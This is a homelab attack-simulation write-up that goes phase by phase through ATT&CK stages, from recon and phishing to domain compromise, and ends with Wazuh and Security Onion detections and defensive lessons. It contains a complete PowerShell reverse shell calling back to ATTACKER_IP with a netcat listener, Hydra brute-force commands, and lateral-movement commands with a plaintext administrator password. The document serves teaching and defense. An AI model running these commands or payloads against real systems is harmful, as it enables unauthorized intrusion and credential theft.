# Attack Walkthrough — E101 Cyber Attack Simulation

## Overview

This document walks through the full cyber attack simulation performed against the enterprise homelab environment. The attack follows the **MITRE ATT&CK framework** and progresses from initial reconnaissance to full domain compromise.

**Target Environment:** `10.0.0.0/24` corporate network  
**Attacker Machine:** Kali Linux (`project-x-attacker`)  
**Primary Targets:** Windows workstation, Domain Controller

---

## Phase 1 — Reconnaissance

**Objective:** Identify live hosts and services on the network.

Before launching any attack, the attacker maps the network to find potential targets.

**Commands used:**
```bash
# Discover live hosts
nmap -sn 10.0.0.0/24

# Port scan target workstation
nmap -sV -sC 10.0.0.100
```

**Findings:**
- `10.0.0.5` — Domain Controller (ports 53, 88, 389, 445 open)
- `10.0.0.100` — Windows workstation (RDP port 3389, WinRM port 5985 open)
- `10.0.0.8` — Corporate server

---

## Phase 2 — Initial Access via Phishing

**MITRE ATT&CK:** T1566 — Phishing  
**Objective:** Trick a corporate user into submitting their credentials.

A fake login page was deployed to mimic the corporate login portal. The phishing site was hosted on the attacker machine and a link was sent to the target user via the MailHog email server.

**How it worked:**
1. Phishing website cloned/created to mimic a corporate login page
2. Email sent to victim (`johnd@corp.project-x.com`) via MailHog
3. Victim visited the link and entered their credentials
4. Credentials were captured server-side by the attacker

**Captured credentials:**
```
Username: johnd
Password: @password123!
```

---

## Phase 3 — Execution via Reverse Shell

**MITRE ATT&CK:** T1059.001 — PowerShell  
**Objective:** Establish a persistent foothold on the victim machine.

With credentials captured, the attacker delivered a PowerShell reverse shell payload to the victim machine.

**Attacker sets up listener:**
```bash
nc -lvnp 4444
```

**PowerShell reverse shell (delivered to victim):**
```powershell
# See scripts/reverse-shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Result:** Shell session established on victim Windows workstation.

---

## Phase 4 — Credential Access / Brute Force

**MITRE ATT&CK:** T1110 — Brute Force  
**Objective:** Obtain additional credentials, especially admin-level accounts.

Using Hydra with a wordlist from SecLists, the attacker brute-forced the WinRM service.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      winrm://10.0.0.100
```

**Result:** Additional credentials discovered for lateral movement.

---

## Phase 5 — Lateral Movement

**MITRE ATT&CK:** T1021 — Remote Services  
**Objective:** Move from the workstation to higher-value targets (domain controller, server).

**Using Evil-WinRM for post-exploitation:**
```bash
evil-winrm -i 10.0.0.100 -u Administrator -p '@Deeboodah1!'
```

**Using NetExec to enumerate and execute across the network:**
```bash
# Check which hosts allow current credentials
nxc smb 10.0.0.0/24 -u Administrator -p '@Deeboodah1!'

# Execute command remotely
nxc smb 10.0.0.5 -u Administrator -p '@Deeboodah1!' -x "whoami"
```

**Using XFreeRDP for GUI access:**
```bash
xfreerdp /u:Administrator /p:'@Deeboodah1!' /v:10.0.0.100
```

---

## Phase 6 — Domain Compromise

**MITRE ATT&CK:** T1078 — Valid Accounts  
**Objective:** Gain full control of the Active Directory domain.

With Administrator credentials and access to the Domain Controller (`10.0.0.5`), the attacker achieved full domain compromise — the ability to create accounts, modify GPOs, access all domain-joined machines, and extract the NTDS database.

---

## Phase 7 — Detection (Blue Team)

**Objective:** Identify what Wazuh and Security Onion detected.

### Wazuh Alerts Generated

| Alert | Rule ID | Severity |
|---|---|---|
| Multiple failed login attempts | 18152 | High |
| PowerShell execution detected | 92210 | High |
| WinRM connection established | 60010 | Medium |
| New admin account activity | 18104 | Medium |
| Lateral movement via SMB | 18118 | High |

### Security Onion — Network-Level Detections

- Unusual outbound TCP connection on port 4444 (reverse shell C2 traffic)
- SMB brute force activity
- RDP login from non-standard source IP

---

## Lessons Learned

**Attacker perspective:**
- Phishing remains highly effective — users clicked the link and entered credentials without verifying the URL
- Weak/common passwords allowed successful brute force attacks
- WinRM and RDP being open on workstations gave multiple lateral movement paths

**Defender perspective:**
- SIEM alerts fired on most stages of the attack, but would require an analyst to correlate them
- PowerShell logging and Wazuh together provided good visibility into execution
- Network segmentation and disabling unnecessary services (WinRM, RDP) on workstations would have significantly raised the bar for the attacker

---

*This attack was performed in a fully isolated lab environment for educational purposes.*
